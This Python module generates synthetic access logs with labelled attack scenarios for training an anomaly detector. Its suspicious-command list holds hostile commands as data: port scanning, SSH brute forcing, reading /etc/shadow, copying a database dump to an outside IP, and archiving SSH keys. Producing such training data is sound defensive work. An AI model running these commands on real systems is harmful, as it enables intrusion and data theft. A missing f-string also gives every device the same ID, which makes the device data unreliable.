"""
Synthetic Data Generator for AI Behavioral Anomaly Detection System.
Generates realistic sequential user and device access logs with embedded cyber attack vectors.
"""

import os
import json
import math
import random
import logging
from datetime import datetime, timedelta
from typing import List, Dict, Any, Tuple

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# List of realistic resources & commands for simulation
STANDARD_RESOURCES = [
    "/api/v1/user/profile",
    "/api/v1/dashboard",
    "/app/index.html",
    "/s3/company-docs/public",
    "/auth/login",
    "/api/v1/notifications",
    "/help/faq"
]

SENSITIVE_RESOURCES = [
    "/admin/users/permissions",
    "/vault/secrets/database_keys",
    "ssh://prod-db-primary.internal",
    "/s3/financial-records-2026/q2_audit.pdf",
    "/api/v1/billing/export-all",
    "/k8s/cluster-admin/config"
]

STANDARD_COMMANDS = [
    ["git pull", "npm test"],
    ["ls -la", "cd /var/www", "cat config.json"],
    ["docker ps", "docker logs app_container"],
    ["python3 main.py --env prod"],
    ["curl -I https://internal-service.local"]
]

SUSPICIOUS_COMMANDS = [
    ["nmap -sS -p 1-65535 10.0.0.0/16", "hydra -L users.txt -P pass.txt ssh://10.0.1.5"],
    ["sudo -i", "cat /etc/shadow", "chmod 777 /etc/passwd"],
    ["scp -r /var/db/dump.tar.gz root@185.220.101.4:/tmp/"],
    ["powershell -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="],
    ["find / -name '*.pem' -o -name '*.key'", "tar -czf /tmp/keys.tgz /root/.ssh"]
]

GEO_CITIES = [
    {"city": "New York", "country": "USA", "lat": 40.7128, "lon": -74.0060, "ip_prefix": "198.51.100."},
    {"city": "London", "country": "UK", "lat": 51.5074, "lon": -0.1278, "ip_prefix": "185.120.44."},
    {"city": "Tokyo", "country": "Japan", "lat": 35.6762, "lon": 139.6503, "ip_prefix": "203.104.110."},
    {"city": "Sydney", "country": "Australia", "lat": -33.8688, "lon": 151.2093, "ip_prefix": "139.130.4."},
    {"city": "Frankfurt", "country": "Germany", "lat": 50.1109, "lon": 8.6821, "ip_prefix": "194.12.200."},
    {"city": "Singapore", "country": "Singapore", "lat": 1.3521, "lon": 103.8198, "ip_prefix": "118.200.12."},
    {"city": "Sao Paulo", "country": "Brazil", "lat": -23.5505, "lon": -46.6333, "ip_prefix": "177.12.80."}
]

AUTH_METHODS = ["MFA_TOTP", "OAuth2", "Password", "SSH_Key", "API_Token"]

ATTACK_TYPES = [
    "Normal",
    "Brute Force",
    "Impossible Travel",
    "Credential Stuffing",
    "Lateral Movement",
    "Device Spoofing",
    "Low and Slow Exfiltration",
    "Insider Drift"
]


class SyntheticDataGenerator:
    """
    Generates realistic user and device behavioral access logs with explicit cyber attack injection.
    """

    def __init__(self, num_entities: int = 2000, num_events: int = 50000, seed: int = 42):
        self.num_entities = num_entities
        self.num_events = num_events
        self.seed = seed
        random.seed(seed)
        self.entity_profiles: Dict[str, Dict[str, Any]] = {}

    def generate_entity_profiles(self) -> Dict[str, Dict[str, Any]]:
        """Creates baseline profiles for users and devices."""
        logger.info(f"Generating behavioral profiles for {self.num_entities} entities...")
        profiles = {}

        for i in range(1, self.num_entities + 1):
            entity_type = "user" if i <= int(self.num_entities * 0.85) else "device"
            entity_id = f"USR-{1000 + i}" if entity_type == "user" else "DEV-{5000 + i}"
            
            home_geo = random.choice(GEO_CITIES)
            start_hour = random.randint(7, 10)
            end_hour = min(23, start_hour + random.randint(8, 10))
            
            preferred_device = f"fp_{random.randint(100000, 999999)}"
            preferred_auth = random.choice(["MFA_TOTP", "OAuth2", "SSH_Key"])
            
            profiles[entity_id] = {
                "entity_id": entity_id,
                "entity_type": entity_type,
                "home_geo": home_geo,
                "normal_start_hour": start_hour,
                "normal_end_hour": end_hour,
                "preferred_device": preferred_device,
                "preferred_auth": preferred_auth,
                "common_resources": random.sample(STANDARD_RESOURCES, k=random.randint(3, 5)),
                "avg_session_duration": random.randint(120, 3600),
                "is_vip_privilege": random.random() < 0.05
            }

        self.entity_profiles = profiles
        return profiles

    def generate_logs(self, attack_ratio: float = 0.02) -> List[Dict[str, Any]]:
        """
        Generates full sequential event dataset with specified attack injection ratio.
        """
        if not self.entity_profiles:
            self.generate_entity_profiles()

        logger.info(f"Generating {self.num_events} sequential events (attack ratio: {attack_ratio*100:.2f}%)...")
        
        events = []
        base_time = datetime(2026, 7, 1, 0, 0, 0)
        entities = list(self.entity_profiles.keys())
        
        num_attack_events = int(self.num_events * attack_ratio)
        num_normal_events = self.num_events - num_attack_events

        # 1. Generate normal events
        logger.info("Generating baseline normal event stream...")
        for _ in range(num_normal_events):
            entity_id = random.choice(entities)
            profile = self.entity_profiles[entity_id]
            
            # Timestamp within normal hours with small probability of off-hour
            day_offset = random.randint(0, 25)
            if random.random() < 0.9:
                hour = random.randint(profile["normal_start_hour"], profile["normal_end_hour"])
            else:
                hour = random.randint(0, 23)
                
            minute = random.randint(0, 59)
            second = random.randint(0, 59)
            event_time = base_time + timedelta(days=day_offset, hours=hour, minutes=minute, seconds=second)

            # Normal parameters
            geo = profile["home_geo"]
            ip = geo["ip_prefix"] + str(random.randint(1, 254))
            device = profile["preferred_device"] if random.random() < 0.95 else f"fp_{random.randint(100000, 999999)}"
            auth = profile["preferred_auth"] if random.random() < 0.92 else random.choice(AUTH_METHODS)
            resource = random.choice(profile["common_resources"])
            session_dur = max(10, int(random.gauss(profile["avg_session_duration"], profile["avg_session_duration"] * 0.2)))
            cmd_seq = random.choice(STANDARD_COMMANDS)
            failed_logins = random.choices([0, 1, 2], weights=[0.94, 0.05, 0.01])[0]

            events.append({
                "entity_id": entity_id,
                "entity_type": profile["entity_type"],
                "timestamp": event_time.isoformat(),
                "source_ip": ip,
                "geo_location": f"{geo['city']}, {geo['country']}",
                "latitude": geo["lat"],
                "longitude": geo["lon"],
                "resource_accessed": resource,
                "authentication_method": auth,
                "session_duration": session_dur,
                "command_sequence": cmd_seq,
                "device_fingerprint": device,
                "failed_login_count": failed_logins,
                "label": 0,
                "attack_type": "Normal"
            })

        # 2. Inject specific cyber attack vectors
        logger.info("Injecting cyber attack scenarios (Brute Force, Impossible Travel, Lateral Movement, etc.)...")
        attack_distribution = {
            "Brute Force": 0.20,
            "Impossible Travel": 0.18,
            "Credential Stuffing": 0.15,
            "Lateral Movement": 0.15,
            "Device Spoofing": 0.12,
            "Low and Slow Exfiltration": 0.10,
            "Insider Drift": 0.10
        }

        attack_types_pool = random.choices(
            list(attack_distribution.keys()),
            weights=list(attack_distribution.values()),
            k=num_attack_events
        )

        for attack_type in attack_types_pool:
            target_entity = random.choice(entities)
            profile = self.entity_profiles[target_entity]
            day_offset = random.randint(0, 25)
            
            if attack_type == "Brute Force":
                # High failed login count in short timeframe
                event_time = base_time + timedelta(days=day_offset, hours=random.randint(1, 23), minutes=random.randint(0, 59))
                failed_cnt = random.randint(15, 60)
                cmd_seq = ["cat /dev/null"]
                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time.isoformat(),
                    "source_ip": "185.220.101.5",
                    "geo_location": "Moscow, Russia",
                    "latitude": 55.7558,
                    "longitude": 37.6173,
                    "resource_accessed": "/auth/login",
                    "authentication_method": "Password",
                    "session_duration": random.randint(2, 10),
                    "command_sequence": cmd_seq,
                    "device_fingerprint": f"fp_attacker_{random.randint(100, 999)}",
                    "failed_login_count": failed_cnt,
                    "label": 1,
                    "attack_type": attack_type
                })

            elif attack_type == "Impossible Travel":
                # Two logins within 15 minutes across continents
                event_time_1 = base_time + timedelta(days=day_offset, hours=10, minutes=0)
                event_time_2 = event_time_1 + timedelta(minutes=random.randint(3, 15))
                
                home_geo = profile["home_geo"]
                distant_geo = [g for g in GEO_CITIES if g["city"] != home_geo["city"]][0]

                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time_2.isoformat(),
                    "source_ip": distant_geo["ip_prefix"] + "99",
                    "geo_location": f"{distant_geo['city']}, {distant_geo['country']}",
                    "latitude": distant_geo["lat"],
                    "longitude": distant_geo["lon"],
                    "resource_accessed": "/api/v1/dashboard",
                    "authentication_method": "OAuth2",
                    "session_duration": 450,
                    "command_sequence": ["ls"],
                    "device_fingerprint": profile["preferred_device"],
                    "failed_login_count": 0,
                    "label": 1,
                    "attack_type": attack_type
                })

            elif attack_type == "Credential Stuffing":
                # Single source IP attacking many accounts
                attacker_ip = "45.142.120.12"
                event_time = base_time + timedelta(days=day_offset, hours=3, minutes=random.randint(0, 50))
                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time.isoformat(),
                    "source_ip": attacker_ip,
                    "geo_location": "Bucharest, Romania",
                    "latitude": 44.4323,
                    "longitude": 26.1063,
                    "resource_accessed": "/auth/login",
                    "authentication_method": "Password",
                    "session_duration": 5,
                    "command_sequence": ["POST /login"],
                    "device_fingerprint": "fp_botnet_script",
                    "failed_login_count": random.randint(8, 25),
                    "label": 1,
                    "attack_type": attack_type
                })

            elif attack_type == "Lateral Movement":
                # Access high privilege resources with suspicious commands
                event_time = base_time + timedelta(days=day_offset, hours=22, minutes=30)
                res = random.choice(SENSITIVE_RESOURCES)
                cmd = random.choice(SUSPICIOUS_COMMANDS)
                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time.isoformat(),
                    "source_ip": profile["home_geo"]["ip_prefix"] + "211",
                    "geo_location": f"{profile['home_geo']['city']}, {profile['home_geo']['country']}",
                    "latitude": profile["home_geo"]["lat"],
                    "longitude": profile["home_geo"]["lon"],
                    "resource_accessed": res,
                    "authentication_method": "SSH_Key",
                    "session_duration": random.randint(1800, 7200),
                    "command_sequence": cmd,
                    "device_fingerprint": profile["preferred_device"],
                    "failed_login_count": 0,
                    "label": 1,
                    "attack_type": attack_type
                })

            elif attack_type == "Device Spoofing":
                # Recognized user with unknown device fingerprint and rare auth method
                event_time = base_time + timedelta(days=day_offset, hours=14, minutes=15)
                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time.isoformat(),
                    "source_ip": "103.251.140.8",
                    "geo_location": "Hanoi, Vietnam",
                    "latitude": 21.0285,
                    "longitude": 105.8542,
                    "resource_accessed": "/admin/users/permissions",
                    "authentication_method": "API_Token",
                    "session_duration": 300,
                    "command_sequence": ["curl -H 'Authorization: Bearer XXX'"],
                    "device_fingerprint": f"fp_spoofed_headers_{random.randint(1000, 9999)}",
                    "failed_login_count": 1,
                    "label": 1,
                    "attack_type": attack_type
                })

            elif attack_type == "Low and Slow Exfiltration":
                # Very gradual off-hour large data downloads
                event_time = base_time + timedelta(days=day_offset, hours=3, minutes=12)
                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time.isoformat(),
                    "source_ip": profile["home_geo"]["ip_prefix"] + "88",
                    "geo_location": f"{profile['home_geo']['city']}, {profile['home_geo']['country']}",
                    "latitude": profile["home_geo"]["lat"],
                    "longitude": profile["home_geo"]["lon"],
                    "resource_accessed": "/api/v1/billing/export-all",
                    "authentication_method": "OAuth2",
                    "session_duration": 14400, # 4 hours
                    "command_sequence": ["wget --limit-rate=50k https://internal/backup.db"],
                    "device_fingerprint": profile["preferred_device"],
                    "failed_login_count": 0,
                    "label": 1,
                    "attack_type": attack_type
                })

            elif attack_type == "Insider Drift":
                # Slow escalation over time
                event_time = base_time + timedelta(days=day_offset, hours=19, minutes=45)
                events.append({
                    "entity_id": target_entity,
                    "entity_type": profile["entity_type"],
                    "timestamp": event_time.isoformat(),
                    "source_ip": profile["home_geo"]["ip_prefix"] + "12",
                    "geo_location": f"{profile['home_geo']['city']}, {profile['home_geo']['country']}",
                    "latitude": profile["home_geo"]["lat"],
                    "longitude": profile["home_geo"]["lon"],
                    "resource_accessed": "/vault/secrets/database_keys",
                    "authentication_method": profile["preferred_auth"],
                    "session_duration": 2400,
                    "command_sequence": ["sudo -i", "cat /etc/passwd"],
                    "device_fingerprint": profile["preferred_device"],
                    "failed_login_count": 0,
                    "label": 1,
                    "attack_type": attack_type
                })

        # Sort chronologically
        events.sort(key=lambda x: x["timestamp"])
        logger.info(f"Generated total {len(events)} events ({num_attack_events} anomalies).")
        return events


def export_generated_data(output_dir: str = "data/generated", num_entities: int = 2000, num_events: int = 50000, seed: int = 42, attack_ratio: float = 0.02):
    """Utility function to generate and save synthetic dataset to disk."""
    os.makedirs(output_dir, exist_ok=True)
    generator = SyntheticDataGenerator(num_entities=num_entities, num_events=num_events, seed=seed)
    profiles = generator.generate_entity_profiles()
    events = generator.generate_logs(attack_ratio=attack_ratio)

    profiles_path = os.path.join(output_dir, "entity_profiles.json")
    events_path = os.path.join(output_dir, "synthetic_access_logs.json")

    with open(profiles_path, "w") as f:
        json.dump(profiles, f, indent=2)

    with open(events_path, "w") as f:
        json.dump(events, f, indent=2)

    logger.info(f"Successfully saved synthetic data to '{output_dir}'.")
    return events, profiles


if __name__ == "__main__":
    export_generated_data()
